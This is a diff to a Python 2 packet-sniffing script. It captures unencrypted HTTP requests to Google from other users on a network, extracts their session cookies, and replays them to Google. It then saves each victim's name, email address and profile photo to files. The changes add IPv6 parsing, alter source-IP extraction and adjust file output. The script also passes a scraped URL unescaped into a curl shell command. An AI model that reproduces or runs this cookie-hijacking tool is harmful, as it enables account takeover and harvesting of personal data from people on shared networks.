@@ -5,6 +5,7 @@ import requests
 import sys
 import threading
 
+
 # necessary for accessing libdnet from within a virtualenv on OSX
 if sys.platform == "darwin":
   import site; site.addsitedir("/usr/local/lib/python2.7/site-packages")
@@ -35,6 +36,21 @@ def extract_google_stok(cookie):
 
 def make_request(cookie, user_ip):
 
+
+	#if ipv6 request
+
+	if user_ip.count(":") >1:
+
+		col_ind = user_ip.rfind(":")
+		temp_ip	 = user_ip[:col_ind]
+		temp_ip = temp_ip.replace(":","")
+	else:
+		temp_ip = user_ip.split(":")[0].replace(".","")
+
+
+	print temp_ip
+
+	
 	url = 'http://www.google.com/?gws_rd=ssl'
 	add_headers = {"Connection": "keep-alive", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.86 Safari/537.36", "Accept-Language": "en-US,en;q=0.8"}
 	add_headers["Cookie"] = cookie
@@ -46,13 +62,14 @@ def make_request(cookie, user_ip):
 	email_div = soup.findAll("div", { "class" : "gb_Db"})
 	email = email_div[0].text.split(" ")[0]
 	usr_img = resp.split("::before{content:url(//")[1].split(");")[0].replace("/s32","/s500")
-	img_file = user_ip.split(":")[0].replace(".","")+".jpg"
+
+	img_file = temp_ip+".jpg"
 
 
-	f = open("./client_files/"+user_ip.split(":")[0].replace(".","")+".html", "w")
+	f = open("./client_files/"+temp_ip+".html", "w")
 	f.write(name+"<br><br><br>")
 	f.write(email+"<br><br><br>")
-	f.write("<img src=\""+img_file+"\" alt=\"Smiley face\" height=\"42\" width=\"42\">")
+	f.write("<img src=\""+img_file+"\" alt=\"Smiley face\" height=\"300\" width=\"300\">")
 	subprocess_cmd("curl "+usr_img+" > ./client_files/"+img_file)
 	f.close()
 	# subprocess_cmd("echo "+name+" > ./"+user_ip.split(":")[0]+"/name.txt")
@@ -72,14 +89,26 @@ def extract_cookie(packet):
 	cur_packet = None
 
 	dest_port = packet.sprintf("{TCP:%TCP.dport%}")
+	x = packet.sprintf("{Raw:%Raw.load%}")[1:-1]
 
-	if dest_port != 'http': #fiter all all other traffic http traffic			
+
+	if dest_port != "http" and dest_port != "www": #fiter all all other traffic http traffic
 		return
 	else:
-		ip_src=packet.sprintf("{IP:%IP.src%}")
+
+		ip_src =  packet.summary().split(" >")[0]
+		sp_last = ip_src.rfind(" ")
+		ip_src =  ip_src[sp_last+1:]
+		col_last = ip_src.rfind(":")
+		ip_src =  ip_src[:col_last]
+
+
 		p_src=packet.sprintf("{TCP:%TCP.sport%}")
+
 		user_key = ip_src+":"+p_src
-		x = packet.sprintf("{Raw:%Raw.load%}")[1:-1]
+
+		print user_key
+
 
 		#create an entry for a user tuple
 		if 'GET /' in x and "host: www.google.com" in x.lower() and user_key not in user_packet:
@@ -132,9 +161,10 @@ def extract_cookie(packet):
 					del user_complete[user_key]
 					del	user_packet[user_key]
 
+
 def main():
 
-	subprocess_cmd("mkdir 777 client_files") #create dir for storing files
+	subprocess_cmd("mkdir -m 777 client_files") #create dir for storing files
 	interface = sys.argv[1]
 	print interface
 	sniff(iface=interface, prn=extract_cookie)
